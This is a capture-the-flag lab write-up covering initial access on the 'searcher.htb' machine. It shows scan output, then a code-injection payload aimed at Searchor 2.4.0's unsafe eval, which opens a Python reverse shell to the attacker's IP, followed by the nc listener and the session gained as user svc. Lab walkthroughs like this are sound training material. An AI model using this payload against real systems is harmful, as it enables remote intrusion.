# Overview

## Footprinting:
```
nmap -sV -A -p- 10.10.11.208 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 20:59 EDT
Nmap scan report for 10.10.11.208
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.38 seconds
```

## Initial foothold:

From the output above, we can see that the attacker machine was not able to resolve the local hostname for the redirect. We can add it to the /etc/hosts file:
```
vim /etc/hosts
10.10.11.208    searcher.htb
```

We can start by enumerating existing folders and directories:
```
dirb http://searcher.htb/  

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon May 15 21:06:35 2023
URL_BASE: http://searcher.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://searcher.htb/ ----
+ http://searcher.htb/search (CODE:405|SIZE:153)                                      
+ http://searcher.htb/server-status (CODE:403|SIZE:277)                               
                                                                                      
-----------------
END_TIME: Mon May 15 21:08:54 2023
DOWNLOADED: 4612 - FOUND: 2
```

Not much information, but we can focus on the /search endpoint by testing the behavior of the web application. With a few requests, we are able to select an engine and search for a keyword with or without the Auto redirection option.
```http
POST /search HTTP/1.1
Host: searcher.htb
Content-Length: 47
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://searcher.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://searcher.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

engine=Amazon&query=GetSomething&auto_redirect=
```

The software versions are listed in the footer of the page:
```
Powered by [Flask](https://flask.palletsprojects.com) and [Searchor 2.4.0](https://github.com/ArjunSharda/Searchor)
```

The current version of Searchor is vulnerable to code execution since there is an unsafe eval usage:
https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303
https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b

We can find a few proof of concept exploits on GitHub:
https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-
https://github.com/jonnyzar/POC-Searchor-2.4.2

We can now generate a payload with our values:
```
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.15',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

Start up a listener on the attacker machine:
```
nc -nlvp 1234
```

With a proxy, intercept the POST request and enter the payload for the unsanitized query parameter:
```http
POST /search HTTP/1.1
Host: searcher.htb
Content-Length: 253
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://searcher.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://searcher.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

engine=Accuweather&query=', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.15',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

The reverse connection is established:
```
nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.208] 46278
/bin/sh: 0: can't access tty; job control turned off

$ whoami
svc
```